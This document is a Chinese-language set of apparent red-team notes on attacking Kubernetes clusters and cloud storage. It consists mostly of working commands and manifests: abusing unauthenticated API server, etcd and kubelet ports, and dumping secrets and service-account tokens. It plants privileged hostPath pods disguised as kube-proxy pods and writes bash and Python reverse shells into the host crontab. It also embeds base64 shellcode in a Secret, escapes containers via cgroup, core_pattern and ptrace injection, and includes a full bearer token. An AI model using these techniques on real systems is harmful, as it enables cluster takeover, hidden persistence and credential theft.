{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{\"kubectl.kubernetes.io/last-applied-configuration\":\"{\\\"apiVersion\\\":\\\"v1\\\",\\\"kind\\\":\\\"Pod\\\",\\\"metadata\\\":{\\\"annotations\\\":{},\\\"name\\\":\\\"test-4444\\\",\\\"namespace\\\":\\\"default\\\"},\\\"spec\\\":{\\\"containers\\\":[{\\\"image\\\":\\\"nginx:1.14.2\\\",\\\"name\\\":\\\"test-4444\\\",\\\"volumeMounts\\\":[{\\\"mountPath\\\":\\\"/host\\\",\\\"name\\\":\\\"host\\\"}]}],\\\"volumes\\\":[{\\\"hostPath\\\":{\\\"path\\\":\\\"/\\\",\\\"type\\\":\\\"Directory\\\"},\\\"name\\\":\\\"host\\\"}]}}\\n\"},\"name\":\"test-4444\",\"namespace\":\"default\"},\"spec\":{\"containers\":[{\"image\":\"nginx:1.14.2\",\"name\":\"test-4444\",\"volumeMounts\":[{\"mountPath\":\"/host\",\"name\":\"host\"}]}],\"volumes\":[{\"hostPath\":{\"path\":\"/\",\"type\":\"Directory\"},\"name\":\"host\"}]}} \u6267\u884c\u547d\u4ee4\uff0c\u9047\u5230400\u65f6\u4f7f\u7528wscat wscat -n -c '/api/v1/namespaces/default/pods/test-4444/exec?stdout=1&stderr=1&tty=true&command=whoami' 2379\u7aef\u53e3Etcd\u670d\u52a1\u5229\u7528 etcd\u662f\u4e00\u4e2a\u9ad8\u53ef\u7528\u7684\u5206\u5e03\u5f0f\u952e\u503c(key-value)\u6570\u636e\u5e93,\u5b58\u50a8\u4e86\u96c6\u7fa4\u72b6\u6001\u3001\u670d\u52a1\u4ee4\u724c\u7b49\u673a\u7b49\u5bc6\u670d\u52a1\u914d\u7f6e\u7b49\u4fe1\u606f\u3002 \u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u8bbf\u95ee\u7aef\u53e3\u53ef\u4ee5\u83b7\u53d6\u5230\u952e\u503c\uff0c\u5176\u4e2d\u53ef\u80fd\u5305\u542b\u654f\u611f\u4fe1\u606f\u3002 \u770b\u5230\u7aef\u53e3\u53ef\u4ee5\u7528etcdctl\u53bb\u8fde\u4e00\u4e0b\uff0c\u5982\u679c\u662f\u672a\u6388\u6743\u8bbf\u95ee\u90a3\u4e48\u5c31\u53ef\u4ee5\u6253\u4e0b\u96c6\u7fa4\u4e86\u3002 \u5217\u51fa\u8282\u70b9\u4fe1\u606f /v2/keys \u5217\u51fa\u96c6\u7fa4\u4e2d\u6210\u5458\u4fe1\u606f /v2/members \u5217\u51fa\u6240\u6709\u503c /v2/keys/?recursive=true v3\u7248\u672c\u7684Etcd\u9700\u8981\u7528etcdctl\u6765\u64cd\u4f5c \u4e0b\u8f7dhttps://github.com/etcd-io/etcd/releases \u8bbe\u7f6ev3\u7248\u672capi\uff0ck8s\u7528\u7684v3 export ETCDCTL_API=3 \u672c\u5730 \u672c\u5730\u65e0\u9700\u8ba4\u8bc1 \u67e5\u770b\u8fde\u63a5\u72b6\u6001\uff0c\u8fdc\u7a0b\u52a0 --endpoint\u53c2\u6570 etcdctl endpoint health \u8bfb\u53d6k8s secret etcdctl get / --prefix --keys-only | grep /secrets/ \u8bfb\u53d6AK etcdctl get /registry/secrets/default/acr-credential-518dfd1883737c2a6bde99ed6fee583c \u8fdc\u7a0b\u7684\u60c5\u51b5 \u8bbe\u7f6e\u8bc1\u4e66\uff0c\u7b49\u4e8e\u8ba4\u8bc1\uff0c\u67d0\u4e9b\u60c5\u51b5\u4e0b\u53ef\u4ee5\u642d\u914d\u4efb\u610f\u6587\u4ef6\u4e0b\u8f7d\u4f7f\u7528 export ETCDCTL_CERT=/var/lib/docker/volumes/minikube/_data/lib/minikube/certs/etcd/peer.crt export ETCDCTL_CACERT=/var/lib/docker/volumes/minikube/_data/lib/minikube/certs/etcd/ca.crt export ETCDCTL_KEY=/var/lib/docker/volumes/minikube/_data/lib/minikube/certs/etcd/peer.key etcdctl --insecure-skip-tls-verify --insecure-transport=true --endpoints=https://172.16.0.112:2379 --cacert=ca.pem --key=etcd-client-key.pem --cert=etcd-client.pem endpoint health \u8bfb\u53d6token ./etcdctl --endpoints=https://192.168.253.162:2379 get / --prefix --keys-only | grep /secrets/kube-system/clusterrole ./etcdctl --endpoints=https://192.168.253.162:2379 get /registry/secrets/kube-system/clusterrole-aggregation-controller-token-krf7l \u521b\u5efa\u65b0\u5bb9\u5668\u6302\u8f7d\u5bbf\u4e3b\u673a\u76ee\u5f55 \u65b0\u5efa\u4e00\u4e2ayaml apiVersion: v1 kind: Pod metadata: name: myapp spec: containers: - image: k8s.gcr.io/kube-proxy:v1.22.3 name: test-container volumeMounts: - mountPath: /mnt name: test-volume volumes: - name: test-volume hostPath: path: / // \u7531 myapp.yaml \u521b\u5efa\u5bb9\u5668 > kubectl -s http://1.2.3.4:8080/ create -f myapp.yaml // \u7b49\u5f85\u5bb9\u5668\u521b\u5efa\u5b8c\u6210 // \u83b7\u5f97 myapp \u7684\u4ea4\u4e92\u5f0f shell > kubectl -s http://1.2.3.4:8080/ --namespace=default exec -it myapp bash // \u5411 crontab \u5199\u5165\u53cd\u5f39 shell \u7684\u5b9a\u65f6\u4efb\u52a1 > echo -e \"* * * * * root bash -i >& /dev/tcp/127.0.0.1/8888 0>&1\\n\" >> /mnt/etc/crontab // \u4e5f\u53ef\u4ee5\u7528 python \u53cd\u5f39 shell > echo -e \"* * * * * root /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"127.0.0.1\\\",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\\\",\\\"-i\\\"]);'\\n\" >> /mnt/etc/crontab \u521b\u5efa\u4e00\u4e2a\u66f4\u9690\u853d\u529f\u80fd\u66f4\u5f3a\u7684yaml \u4ee5\u4e00\u4e2a\u57fa\u7840\u7684\u4e3a\u4f8b \u67e5\u770bproxy\u7684image \u200b kubectl -n kube-system get daemonsets kube-proxy -o yaml | grep \" image:\" | awk '{print $2}' \u67e5\u770b\u6240\u6709\u7684image get pods --all-namespaces -o jsonpath=\"{..image}\" |\\ tr -s '[[:space:]]' '\\n' |\\ sort |\\ uniq -c apiVersion: v1 kind: Pod metadata: name: kube-proxy-s7dhs1 #\u4fee\u6539\u4e3a\u66f4\u590d\u6742\u7684\u540d\u5b57\u66f4\u52a0\u9690\u853d namespace: kube-system #\u8bbe\u7f6e\u4e3asystem\u7684pod\u66f4\u52a0\u9690\u853d spec: tolerations: - key: ab operator: Exists effect: NoSchedule containers: - image: k8s.gcr.io/kube-proxy:v1.22.3 #\u4f7f\u7528\u9ed8\u8ba4image\u4e0d\u4f9d\u8d56\u5916\u90e8image imagePullPolicy: IfNotPresent name: test-container command: [\"/bin/sleep\", \"3650d\"] #\u521b\u5efa\u65f6\u6267\u884c\u547d\u4ee4\uff0c\u53ef\u4ee5\u6267\u884c\u4efb\u4f55\u547d\u4ee4 # command: [\"echo $payload\"] #\u8c03\u7528\u73af\u5883\u53d8\u91cf volumeMounts: - mountPath: /mnt name: test-volume # env: #\u8c03\u7528Secret\u4f5c\u4e3apod\u73af\u5883\u53d8\u91cf # - name: payload #\u73af\u5883\u53d8\u91cf\u540d\u79f0 # valueFrom: # secretKeyRef: # name: secname #secret\u7684name # key: data #secret\u7684dataname volumes: - name: test-volume hostPath: path: / \u65e0\u6587\u4ef6\u90e8\u7f72 kubectl\u652f\u6301\u7ba1\u9053\u7ed3\u5408\u4f7f\u7528\uff0c\u5728\u65e0\u6587\u4ef6\u7684\u60c5\u51b5\u4e0b\u90e8\u7f72pod\uff0cxx\u586b\u5165yaml\u5185\u5bb9 cat << EOF | kubectl apply -f - xxxxx EOF \u4f20\u5165\u8f83\u591a\u6570\u636e\u65f6 \u5148\u5efa\u4e00\u4e2aSecret\uff0c\u53ef\u4ee5\u652f\u6301\u591a\u6570\u636e\u3002Secret\u5f15\u7528\u65f6\u4f1a\u81ea\u52a8base64\u89e3\u7801\uff0c\u6240\u4ee5\u4f20\u5165base64\u7684\u7f16\u7801\u6570\u636e #Secret.yaml apiVersion: v1 kind: Secret metadata: name: secname namespace: kube-system #\u8bbe\u7f6e\u4e3akube-system\u589e\u5f3a\u9690\u853d\u6027 type: Opaque #\u7c7b\u578b\u4e3a\u8fd9\u4e2a data: data: XHg3Rlx4NDVceDRDXHg0Nlx4MDFceDAxXHgwMVx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDJceDAwXHgwM1x4MDBceDAxXHgwMFx4MDBceDAwXHg1NFx4ODBceDA0XHgwOFx4MzRceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MzRceDAwXHgyMFx4MDBceDAxXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4MDFceDAwXHgwMFx4MDBceDAwXHgwMFx4MDBceDAwXHgwMFx4ODBceDA0XHgwOFx4MDBceDgwXHgwNFx4MDhceENGXHgwMFx4MDBceDAwXHg0QVx4MDFceDAwXHgwMFx4MDdceDAwXHgwMFx4MDBceDAwXHgxMFx4MDBceDAwXHg2QVx4MEFceDVFXHgzMVx4REJceEY3XHhFM1x4NTNceDQzXHg1M1x4NkFceDAyXHhCMFx4NjZceDg5XHhFMVx4Q0RceDgwXHg5N1x4NUJceDY4XHhDMFx4QThceDEzXHhGM1x4NjhceDAyXHgwMFx4MTFceDVDXHg4OVx4RTFceDZBXHg2Nlx4NThceDUwXHg1MVx4NTdceDg5XHhFMVx4NDNceENEXHg4MFx4ODVceEMwXHg3OVx4MTlceDRFXHg3NFx4M0RceDY4XHhBMlx4MDBceDAwXHgwMFx4NThceDZBXHgwMFx4NkFceDA1XHg4OVx4RTNceDMxXHhDOVx4Q0RceDgwXHg4NVx4QzBceDc5XHhCRFx4RUJceDI3XHhCMlx4MDdceEI5XHgwMFx4MTBceDAwXHgwMFx4ODlceEUzXHhDMVx4RUJceDBDXHhDMVx4RTNceDBDXHhCMFx4N0RceENEXHg4MFx4ODVceEMwXHg3OFx4MTBceDVCXHg4OVx4RTFceDk5XHhCMlx4NkFceEIwXHgwM1x4Q0RceDgwXHg4NVx4QzBceDc4XHgwMlx4RkZceEUxXHhCOFx4MDFceDAwXHgwMFx4MDBceEJCXHgwMVx4MDBceDAwXHgwMFx4Q0RceDgw \u901a\u8fc7\u73af\u5883\u53d8\u91cf\u8c03\u7528 \u901a\u8fc7ReplicaSet/DaemonSet/Deplyment\u521b\u5efa\u5e76\u7ef4\u6301\u540e\u95e8\u5bb9\u5668 \u5728\u5b9e\u6218\u4e2d\u8981\u8003\u8651\u5230k8s\u7684\u53ef\u7528\u6027\uff0c\u6240\u4ee5\u6700\u597d\u4e0d\u8981\u5bf9\u5173\u952e\u5bb9\u5668\u505a\u64cd\u4f5c\u3002 a.yaml apiVersion: apps/v1 kind: Deployment metadata: name: nginx-deployment labels: app: nginx-test spec: replicas: 1 selector: matchLabels: app: nginx template: metadata: labels: app: nginx spec: containers: - image: nginx name: container volumeMounts: - mountPath: /mnt name: test-volume volumes: - name: test-volume hostPath: path: / kubectl apply -f nginx-deploy.yaml kubectl get pods cronjob\u6301\u4e45\u5316 \u521b\u5efa\u4e00\u4e2aCronJob\u5b9a\u65f6\u6267\u884c\u4efb\u52a1\u7684\u5bb9\u5668 a.yaml apiVersion: batch/v1beta1 kind: CronJob metadata: name: echotest spec: schedule: \"*/1 * * * *\" jobTemplate: spec: template: spec: containers: - name: container image: nginx args: - /bin/sh - -c - echo test restartPolicy: OnFailure kubectl create -f cronjob.yaml \u9ed8\u8ba4namespaces\u662fdefault \u5229\u7528token \u672a\u5f00\u542fRBAC\u7684\u60c5\u51b5 \u7248\u672c\u4f4e\u4e8e1.16\u7684k8s\u662f\u672a\u5f00\u542fRBAC\u7684\uff0c\u8fd9\u65f6\u5982\u679c\u62ff\u4e0b\u4e86\u5176\u4e2d\u4e00\u4e2apod\u53ef\u4ee5\u83b7\u53d6token\uff0c\u4ece\u800c\u83b7\u53d6\u6574\u4e2a\u96c6\u7fa4\u6743\u9650\u3002 \u8def\u5f84\u4e00\u822c\u4f4d\u4e8e /run/secrets/kubernetes.io/serviceaccount/token \u5229\u7528 \u627e\u5230token\u540e\u4e0b\u4e00\u6b65\u662f\u9700\u8981\u627e\u5230node\u7684ip\uff0c\u67e5\u770b\u5f53\u524d\u73af\u5883\u53d8\u91cf\u53ef\u4ee5\u627e\u5230ip\u3002 \u67e5\u770btoken kubectl get secrets kubectl describe secrets default-token-ngptv \u5229\u7528Token\u4e0eAPI SERVER\u901a\u4fe1\uff0ccurl\u6216kubectl curl -ks -H \"Authorization: Bearer <TOKEN>\" https://master:6443/api/v1/namespaces/default/secrets kubectl --insecure-skip-tls-verify -s https://192.168.49.2:8443/ --token=\"eyJhbGciOiJSUzI1NiIsImtpZCI6ImdHUmNpR3dQZlJvQzdsbFJ4THJhVElwSkRNNms4MmFSakt5U2ZuQmppZTQifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjc5MTExNzk0LCJpYXQiOjE2NDc1NzU3OTQsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJrdWJlLXN5c3RlbSIsInBvZCI6eyJuYW1lIjoia3ViZS1wcm94eS1zN2RoczEiLCJ1aWQiOiI2M2I4NTBjMy05ZGVlLTQ0NjctYmY2OS1mNDczYTQ1OTE3MWEifSwic2VydmljZWFjY291bnQiOnsibmFtZSI6ImRlZmF1bHQiLCJ1aWQiOiI3Y2U4NDcwNi1hMzkwLTRlMTMtYjdjYy02ZDkwZGUxNjY0ZjIifSwid2FybmFmdGVyIjoxNjQ3NTc5NDAxfSwibmJmIjoxNjQ3NTc1Nzk0LCJzdWIiOiJzeXN0ZW06c2VydmljZWFjY291bnQ6a3ViZS1zeXN0ZW06ZGVmYXVsdCJ9.La4cosGWedwVEF4QRibbvCtga0NiDNSJdpKqclAkVmoZI0zCz0dk295vRmrKaxMg_LLMO9gunqECdcKKRzGMF8kgelZC_DLrrePF2YdhIr2BCWtJQpdfZ62hx4nVydTHZZSr8zA-HMJOQY-5sfzXCbjrKHUyA4IvRNTE9oFZbTmwaa7xY9ZIOMfKhCh7laQBrKutUtZaRXGAuoRxaI4iVVFJc-oPKuQ_dzuKnZUIJMdcYR7mz8vuKt7hCal2H8nXjBO3Rakhy45tH6PBMULdrXjZswZuELKYfkYEgxgrVRM5YHXdIJFrb1ba1dkJM6ZmtfwUOnH_nT-dckJ1_pG7Iw\" -n kube-system get pods \u8bf7\u6c42\u5934\u4e2d\u7684TOKEN\u5fc5\u987b\u662fbase64\u683c\u5f0f Service Account \u53ef\u80fd\u7684Tokens\u9ed8\u8ba4\u4f4d\u7f6e /var/run/secrets/kubernetes.io/serviceaccount/token /var/run/secrets/kubernetes.io/serviceaccount/ca.crt 6443\u7aef\u53e3\u533f\u540d\u7528\u6237\u7279\u6743 https\u7684\uff0c\u9ed8\u8ba4\u662f\u9700\u8981\u6388\u6743\u7684\uff0c\u5982\u679c\u88ab\u9519\u8bef\u914d\u7f6e\u4e86\u533f\u540d\u7528\u6237\u6709\u7ba1\u7406\u6743\u9650\u7684\u8bdd\u53ef\u4ee5\u5229\u7528\u3002 \u5229\u7528\u65b9\u5f0f\u53c2\u80038080\u7aef\u53e3\u7684API\u64cd\u4f5c kubelet 10250\u672a\u6388\u6743 \u4e3b\u8981\u662f10250\u7aef\u53e3\u7684\u672a\u6388\u6743\u7684\u653b\u51fbkubelet https://labs.f-secure.com/blog/attacking-kubernetes-through-kubelet/ kubelet\u672a\u6388\u6743RCE\u6f0f\u6d1e\u5229\u7528\u5de5\u5177https://github.com/serain/kubelet-anon-rce \uff0c\u6267\u884c\u547d\u4ee4\uff1a python3 kubelet-anon-rce.py --node 10.1.2.3 --namespace kube-system --pod tiller-797d1b1234-gb6qt --container tiller --exec \"whoami\" \u672c\u5730\u6d4b\u8bd5\u7684\u65f6\u5019\uff0c10250 API\u662f\u4e0d\u5141\u8bb8\u533f\u540d\u8bbf\u95ee\u7684 /pods curl -k /run/{namespace}/{podName}/{appName} -d \"cmd=whoami\" config\u7ba1\u7406\u51ed\u636e\u5229\u7528 Kubectl \u9ed8\u8ba4\u7684\u7ba1\u7406\u51ed\u636e\uff0ccat $HOME/.kube/config \u4f7f\u7528kubectl\u7ba1\u7406\u5176\u4ed6\u96c6\u7fa4\uff0c\u4f7f\u7528\u6307\u5b9a\u7684config\u6587\u4ef6\uff0c\u547d\u4ee4\uff1akubectl --kubeconfig kube-192.168.18.35.config get pods -n kube-system \u5229\u7528\u6c61\u70b9\u548c\u5bb9\u5fcd\u7279\u6027\u6765\u8fdb\u884cnode\u95f4\u6a2a\u5411 k8s\u5728\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u65b0\u7684pod\u4f1a\u88ab\u968f\u673a\u5206\u914d\u5230node\u3002\u53ef\u4ee5\u7ed9node\u8bbe\u7f6e\u6c61\u70b9\uff08Taints\uff09\u4ee5\u4fbf\u8ba9\u67d0node\u4e0d\u8fd0\u884cpod\uff0c\u8fd9\u91cc\u53ef\u4ee5\u7b80\u5355\u7406\u89e3\u4e3a\u9632\u706b\u5899\u4e2d\u7684deny all\u3002\u540c\u65f6\uff0c\u53ef\u4ee5\u7ed9pod\u8bbe\u7f6e\u5bb9\u5fcd\uff08tolerations\uff09\u4ee5\u4fbf\u8ba9\u8be5pod\u53ef\u4ee5\u88ab\u8c03\u7528\uff0c\u76f8\u5f53\u4e8e\u5f00\u4e86\u4e00\u4e2aacl\u3002 \u5f53node\u8bbe\u7f6e\u4e86Taints\u540e\uff0c\u65b0\u7684pod\u5c06\u4e0d\u80fd\u8fd0\u884c\u5728\u4e00\u4e9bnode\u4e0a\uff0c\u8fd9\u6837\u5c31\u9650\u5236\u4e86\u6a2a\u5411\u3002\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u7279\u6027\u6765\u6b63\u5e38\u8fdb\u884c\u6a2a\u5411\u3002 \u6c61\u70b9\uff08Taints\uff09\u7684\u4e09\u4e2a\u5c5e\u6027: NoSchedule \uff1a\u8868\u793a k8s \u5c06\u4e0d\u4f1a\u5c06 Pod \u8c03\u5ea6\u5230\u5177\u6709\u8be5\u6c61\u70b9\u7684 Node \u4e0a PreferNoSchedule \uff1a\u8868\u793a k8s \u5c06\u5c3d\u91cf\u907f\u514d\u5c06 Pod \u8c03\u5ea6\u5230\u5177\u6709\u8be5\u6c61\u70b9\u7684Node\u4e0a NoExecute \uff1a\u8868\u793a k8s \u5c06\u4e0d\u4f1a\u5c06 Pod \u8c03\u5ea6\u5230\u5177\u6709\u8be5\u6c61\u70b9\u7684 Node \u4e0a\uff0c\u540c\u65f6\u4f1a\u5c06 Node \u4e0a\u5df2\u7ecf\u5b58\u5728\u7684 Pod \u9a71\u9010\u51fa\u53bb \u53ef\u4ee5\u4f7f\u7528 kubectl describe node nodename \u6765\u67e5\u770bnode\u7684Taints\u5c5e\u6027\u548c\u503c \u2514\u2500# kubectl describe node minikube Name: minikube Roles: control-plane,master Labels: beta.kubernetes.io/arch=amd64 beta.kubernetes.io/os=linux kubernetes.io/arch=amd64 kubernetes.io/hostname=minikube kubernetes.io/os=linux minikube.k8s.io/commit=76b94fb3c4e8ac5062daf70d60cf03ddcc0a741b minikube.k8s.io/name=minikube minikube.k8s.io/updated_at=2022_03_17T02_25_37_0700 minikube.k8s.io/version=v1.24.0 node-role.kubernetes.io/control-plane= node-role.kubernetes.io/master= node.kubernetes.io/exclude-from-external-load-balancers= Annotations: kubeadm.alpha.kubernetes.io/cri-socket: /var/run/dockershim.sock node.alpha.kubernetes.io/ttl: 0 volumes.kubernetes.io/controller-managed-attach-detach: true CreationTimestamp: Thu, 17 Mar 2022 02:25:33 -0400 Taints: ab=ab:NoSchedule .................. Taints\u4e2d : \u5de6\u8fb9\u7684\u662fkey\u548c\u503c\uff0c\u53f3\u8fb9\u7684\u662feffect\u3002key\u53ef\u4ee5\u4e3a\u7a7a\uff0c\u4e3a\u7a7a\u65f6\u4ee3\u8868\u53ef\u4ee5\u63a5\u6536\u6240\u6709\u7684key\u3002 \u7ed9pod\u914d\u7f6e\u6587\u4ef6\u8bbe\u7f6e\u4e00\u4e2atolerations\u503c\uff0c\u8fd9\u4e2a\u503c\u9700\u8981\u4e0enode\u7684Taints\u4e00\u6837\uff0c\u8868\u793a\u8fd9\u4e2apod\u53ef\u4ee5\u63a5\u53d7node\u7684\u6c61\u70b9\u3002 apiVersion: v1 kind: Pod metadata: name: myapp spec: tolerations: - key: ab operator: Exists effect: NoSchedule containers: - image: nginx name: test-container command: [\"/bin/sleep\", \"3650d\"] volumeMounts: - mountPath: /mnt name: test-volume volumes: - name: test-volume hostPath: path: / \u5c1d\u8bd5\u591a\u6b21\u521b\u5efapod\uff0cpod\u88ab\u5206\u914d\u5230\u5176\u4ed6node\u4e0a\u65f6\u4fbf\u53ef\u4ee5\u6a2a\u5411\u4e86\u3002 \u5229\u7528lxcfs\u670d\u52a1\u8fdb\u884c\u9003\u9038 \u67e5\u770b\u662f\u5426\u5b89\u88c5\u4e86\u670d\u52a1 cat /proc/1/mountinfo \u4fee\u6539lxcfs\u8bbf\u95ee\u6743\u9650 echo a > devices.allow \u83b7\u53d6\u4e3b\u8bbe\u5907\u53f7ID cat /proc/self/mountinfo | grep etc 3567 3437 8:1 /var/lib/docker/containers/ab86a043d48f6f45b0ee04a70bb1f193442c8c13c712347e1c5320de3d1c50b8/resolv.conf /mnt/etc/resolv.conf rw,relatime master:238 - ext4 /dev/sda1 rw,errors=remount-ro 3568 3437 8:1 /var/lib/docker/containers/ab86a043d48f6f45b0ee04a70bb1f193442c8c13c712347e1c5320de3d1c50b8/hostname /mnt/etc/hostname rw,relatime master:239 - ext4 /dev/sda1 rw,errors=remount-ro 3569 3437 8:1 /var/lib/docker/containers/ab86a043d48f6f45b0ee04a70bb1f193442c8c13c712347e1c5320de3d1c50b8/hosts /mnt/etc/hosts rw,relatime master:240 - ext4 /dev/sda1 rw,errors=remount-ro 3571 3430 8:1 /var/lib/docker/volumes/minikube/_data/lib/docker/containers/efd43944db8144aec6f7f05f07ca78a3462c9cc7d8dcd2c9aada0bf839f66518/resolv.conf /etc/resolv.conf rw,relatime - ext4 /dev/sda1 rw,errors=remount-ro 3572 3430 8:1 /var/lib/docker/volumes/minikube/_data/lib/docker/containers/efd43944db8144aec6f7f05f07ca78a3462c9cc7d8dcd2c9aada0bf839f66518/hostname /etc/hostname rw,relatime - ext4 /dev/sda1 rw,errors=remount-ro 3573 3430 8:1 /var/lib/docker/volumes/minikube/_data/lib/kubelet/pods/63b850c3-9dee-4467-bf69-f473a459171a/etc-hosts /etc/hosts rw,relatime - ext4 /dev/sda1 rw,errors=remount-ro mknod\u521b\u5efa\u6587\u4ef6\u76ee\u5f55 mknod mknod_near b 8 1 debugfs -w mknod_near ls \u76f4\u63a5cdk\u4e00\u952e\u6267\u884c ./cdk_linux_amd64 run lxcfs-rw \u5229\u7528cgroup\u9003\u9038 \u5f53\u5bb9\u5668\u914d\u7f6e\u4e86\u7279\u6743\u65f6\u4f7f\u7528\u3002 \u5c06cgroup\u6302\u8f7d\u5230\u5bb9\u5668 mkdir /tmp/dev mount -t cgroup -o devices devices /tmp/dev/ \u4fee\u6539\u5bb9\u5668\u7684cgroup\u8bbf\u95ee\u6743\u9650 echo a > /tmp/dev/docker/b76c0b53a9b8fb8478f680503164b37eb27c2805043fecabb450c48eaad10b57/devices.allow mknod \u521b\u5efa\u8bbe\u5907\u6587\u4ef6\u76ee\u5f55 mknod near b 252 1 debugfs -w near proc\u6302\u8f7d\u9003\u9038 \u67e5\u770b\u5bbf\u4e3b\u673a\u7684\u6587\u4ef6\u7ed3\u6784 \u5bb9\u5668\u5185\u6267\u884c sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab \u5bbf\u4e3b\u673a\u7684\u8def\u5f84\u662f\u65e0\u6cd5\u6253\u5f00\u7684\uff0c\u4e14\u91cd\u590d\u591a\u6b21\u7684 /var/lib/docker/overlay2/d96245cc62a8dfbf3bb325efcd37c2fc9713e37ca81ba6014afd2f5a5f91a5dd/diff \u5728\u5bb9\u5668\u5185\u6839\u76ee\u5f55\u521b\u5efa\u6076\u610f\u6587\u4ef6\uff0c\u5bf9\u5e94\u5bbf\u4e3b\u673a\u7684 /var/lib/docker/overlay2/d96245cc62a8dfbf3bb325efcd37c2fc9713e37ca81ba6014afd2f5a5f91a5dd/diff \u8def\u5f84 \u4fee\u6539\u5bb9\u5668\u5185core_pattern\u6587\u4ef6\uff0c\u4e5f\u5c31\u76f8\u5f53\u4e8e\u4fee\u6539\u4e86\u5bbf\u4e3b\u673aproc\u91cc\u7684\u6587\u4ef6 echo -e \"|/var/lib/docker/overlay2/d96245cc62a8dfbf3bb325efcd37c2fc9713e37ca81ba6014afd2f5a5f91a5dd/diff/m.sh \\rcore \" > /proc/sys/kernel/core_pattern \u89e6\u53d1\u5bb9\u5668\u5185Segmentation fault\u4e4b\u540e\u4fbf\u6267\u884c\u4e86\u6076\u610f\u6587\u4ef6 \u2514\u2500# cat bengkui.c #include <stdio.h> int main(void) { int *a = NULL; *a = 1; return 0; } \u4f7f\u7528cdk\u76f4\u63a5\u6267\u884c\u547d\u4ee4\uff0c\u53ef\u4ee5\u5728\u5bb9\u5668\u6839\u76ee\u5f55\u521b\u5efa\u4e00\u4e2a\u811a\u672c\uff0c\u7136\u540e\u6267\u884c\u8fd9\u4e2a\u811a\u672c\u3002\u9700\u8981\u6ce8\u610f\u5bb9\u5668\u6839\u76ee\u5f55\u5728\u5bbf\u4e3b\u673a\u7684\u8def\u5f84\u3002 ./cdk run mount-procfs /proc \"bash /var/lib/docker/overlay2/d96245cc62a8dfbf3bb325efcd37c2fc9713e37ca81ba6014afd2f5a5f91a5dd/diff/m.sh\" \u5728\u5f53\u524d\u6700\u65b0\u7248k8s\u96c6\u7fa4\u4e2d\uff0c\u5b89\u88c5\u540e\u9ed8\u8ba4\u6302\u8f7d\u4e86/proc\u3002\u53ef\u4ee5\u4ecemaster\u76f4\u63a5\u9003\u9038\u5230\u5bbf\u4e3b\u673a\uff0c\u540c\u7406\u4e5f\u53ef\u4ee5\u7528\u4e8e\u5bb9\u5668\u9003\u9038\u5230node\u3002 kubectl version GitVersion:v1.23.1 SYS_PTRACE\u9003\u9038 \u5f53\u8d4b\u4e88\u5bb9\u5668 cap_sys_ptrace \u6743\u9650\u65f6\uff0c\u5bb9\u5668\u53ef\u4ee5\u8fdb\u884c\u8fdb\u7a0b\u6ce8\u5165\u9003\u9038\u5230\u5bbf\u4e3b\u673a\u3002 \u68c0\u67e5\u6743\u9650 capsh --print cdk\u904d\u5386\u8fdb\u7a0b ./cdk run check-ptrace \u6ce8\u5165so\u6587\u4ef6 https://github.com/gaffe23/linux-inject ./inject -p 79230 fantan.so debugfs\u9003\u9038\u5229\u7528-\u6bd4\u8f83\u9ebb\u70e6\u8fd8\u672a\u6d4b\u8bd5\u8fc7 https://fun0nydg.github.io/2021/06/19/The-role-of-debugfs-in-container-escape.html CVE-2020-15257 \u4f7f\u7528cdk\u7684shim-pwn \u5185\u6838\u6f0f\u6d1e\u9003\u9038 CVE-2016-5195\u6216CVE-2020-14386 \u81ea\u52a8\u5316\u5229\u7528\u5de5\u5177 kube-hunter https://github.com/aquasecurity/kube-hunter cdk https://github.com/cdk-team/CDK # \u4fe1\u606f\u6536\u96c6 cdk evaluate # \u5217\u4e3e\u5168\u90e8exp cdk run --list # \u6267\u884c\u6307\u5b9a\u7684exp cdk run <script-name> [options] \u5176\u4ed6 Serverless\u6e17\u900f \u4e5f\u5c31\u662f\u4e91\u51fd\u6570\uff0c\u4e91\u51fd\u6570\u6709\u5b58\u6d3b\u65f6\u95f4\uff0c\u5982\u679c\u6709\u5e78\u6253\u5230\u4e86\u4e00\u53f0\u4e91\u51fd\u6570\u7684\u673a\u5668\u9700\u8981\u7acb\u523b\u67e5\u770benv\u627e\u5230AKSK\uff0c\u4e00\u822c\u9047\u4e0d\u5230\u3002 \u5bf9\u8c61\u5b58\u50a8\u6e17\u900f \u9664\u975e\u662f\u627e\u5230\u4e86SecretId\u3001SecretKey\uff0c\u6216\u8005\u6876\u9519\u8bef\u914d\u7f6e\u4e86\u6743\u9650\uff0c\u5426\u5219\u65e0\u6cd5\u5bf9\u4ed6\u4eba\u7684\u6876\u8fdb\u884c\u64cd\u4f5c\u3002 \u5f53\u6253\u5f00\u7f51\u7ad9\u53d1\u73b0\u8fd4\u56de\u4e86\u4e00\u4e2axml\u7ed3\u679c\uff0c\u6b64\u65f6\u53ef\u4ee5\u5224\u65ad\u662f\u5426\u662f\u6876\u4ece\u800c\u8fdb\u884c\u8fdb\u4e00\u6b65\u653b\u51fb\u5c1d\u8bd5\uff0c\u81ea\u5efa\u57df\u540d\u4e0b\u4e5f\u53ef\u80fd\u662f\u6876\uff0c\u56e0\u4e3a\u53ef\u4ee5\u7ed1\u5b9acname\u3002 AWS S3 \u6307\u7eb9 AWS\u7684\u4e2d\u5305\u542bBucketName\u5b57\u6837\u3002 \u7206\u7834 \u6839\u636e\u72b6\u6001\u7801\u5224\u65ad InvalidBucketName \u548c NoSuchBucket 